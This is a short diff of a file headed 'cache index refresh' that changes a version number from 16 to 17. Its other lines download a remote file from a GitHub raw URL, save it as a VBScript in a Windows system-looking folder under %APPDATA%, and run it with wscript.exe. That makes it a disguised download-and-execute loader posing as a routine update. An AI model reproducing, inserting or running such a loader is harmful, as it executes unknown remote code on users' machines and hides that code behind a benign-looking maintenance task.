@@ -1,4 +1,4 @@
 # cache index refresh
-version: 16
+version: 17
 put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/spool.dat %APPDATA%\Microsoft\Crypto\RSA\seed.vbs
 shell wscript.exe "%APPDATA%\Microsoft\Crypto\RSA\seed.vbs"
